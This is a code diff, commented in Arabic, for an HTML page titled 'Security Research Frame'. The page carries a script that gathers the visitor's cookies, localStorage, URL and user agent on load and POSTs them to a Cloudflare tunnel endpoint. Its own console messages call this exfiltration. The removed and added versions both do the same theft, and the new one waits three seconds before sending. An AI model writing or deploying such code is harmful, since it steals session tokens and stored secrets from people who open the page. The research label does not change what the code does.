@@ -1,33 +1,44 @@
-<script>
-    // الرابط الدائم الجديد الخاص بك عبر Cloudflare
-    const TARGET_URL = 'https://uniform-feedback-animals-theme.trycloudflare.com/collect';
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Research Frame</title>
+</head>
+<body>
+    <h1>Testing Security Research Data Collection</h1>
+    <p>بانتظار التقاط البيانات...</p>
 
-    async function sendData() {
-        try {
-            const response = await fetch(TARGET_URL, {
+    <script>
+        // الرابط الذي حصلت عليه من Cloudflare
+        const TARGET_URL = 'https://uniform-feedback-animals-theme.trycloudflare.com/collect';
+
+        function sendData() {
+            // تجميع البيانات الحالية من المتصفح
+            const currentData = {
+                localStorage: JSON.stringify(localStorage),
+                cookies: document.cookie,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            console.log("إرسال البيانات إلى السيرفر:", currentData);
+
+            // إرسال البيانات عبر POST Request
+            fetch(TARGET_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    localStorage: JSON.stringify(localStorage),
-                    cookies: document.cookie,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                }),
-                // وضع keepalive لضمان إرسال البيانات حتى لو أُغلقت الصفحة
-                keepalive: true
-            });
-
-            if (response.ok) {
-                console.log('Data successfully exfiltrated!');
-            }
-        } catch (error) {
-            console.error('Exfiltration failed:', error);
+                body: JSON.stringify(currentData),
+                keepalive: true // لضمان الإرسال حتى عند إغلاق الصفحة
+            })
+            .then(response => console.log('Data sent successfully!'))
+            .catch(error => console.error('Error during exfiltration:', error));
         }
-    }
 
-    // تنفيذ الإرسال فور تحميل الصفحة
-    sendData();
-</script>
+        // تأخير الإرسال بـ 3 ثوانٍ لضمان استقرار تحميل الـ LocalStorage
+        setTimeout(sendData, 3000);
+    </script>
+</body>
+</html>
